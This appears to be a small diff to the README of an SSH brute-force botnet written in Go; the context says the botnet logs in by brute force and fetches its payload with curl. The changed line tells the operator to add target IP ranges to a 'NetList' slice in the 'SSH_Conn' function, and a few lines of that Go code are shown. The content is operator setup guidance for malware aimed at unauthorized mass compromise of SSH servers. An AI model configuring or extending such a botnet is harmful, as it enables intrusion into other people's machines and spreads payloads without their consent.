@@ -30,7 +30,7 @@ and login by Brute-force attack. This botnet will use "curl" to get payload from
 		case var_name:
 				return ManageIP_range(ipRange, "")
 
-(3) Then go to The "SSH_Conn" function, And add your constant ip range to The slice name "NetList".
+(3) Then go to The "SSH_Conn" function, And add your ip constant to The slice name "NetList".
 
 		NetList := []string{
 			chpn1, chpn2, chpn3, chpn4, chpn5, cgpn1, cgpn2, cgpn3,
